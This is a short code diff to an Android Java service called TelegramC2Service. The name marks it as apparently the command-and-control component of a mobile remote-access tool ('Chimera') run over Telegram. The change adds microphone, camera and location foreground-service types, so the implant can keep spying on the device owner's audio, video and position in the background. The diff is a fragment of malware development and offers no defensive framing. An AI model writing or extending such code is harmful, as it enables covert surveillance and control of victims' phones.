@@ -8,6 +8,7 @@ import android.app.PendingIntent;
 import android.app.Service;
 import android.content.Context;
 import android.content.Intent;
+import android.content.pm.ServiceInfo;
 import android.os.Build;
 import android.os.Handler;
 import android.os.IBinder;
@@ -18,7 +19,7 @@ public class TelegramC2Service extends Service {
     private Thread workerThread;
     private final Handler inactivityHandler = new Handler(Looper.getMainLooper());
     private Runnable stopRunnable;
-    private static final long INACTIVITY_TIMEOUT_MS = 10 * 60 * 1000; // 10 minutes
+    private static final long INACTIVITY_TIMEOUT_MS = 10 * 60 * 1000;
 
     private static final String CHANNEL_ID = "ChimeraServiceChannel";
     private static final int NOTIFICATION_ID = 1;
@@ -28,7 +29,14 @@ public class TelegramC2Service extends Service {
         super.onCreate();
         try {
             createNotificationChannel();
-            startForeground(NOTIFICATION_ID, createNotification());
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
+                startForeground(NOTIFICATION_ID, createNotification(),
+                        ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE |
+                        ServiceInfo.FOREGROUND_SERVICE_TYPE_CAMERA |
+                        ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION);
+            } else {
+                startForeground(NOTIFICATION_ID, createNotification());
+            }
             stopRunnable = this::stopSelf;
         } catch (Exception e) {
             ErrorLogger.logError(this, "TelegramC2Service_FATAL_ONCREATE", e);
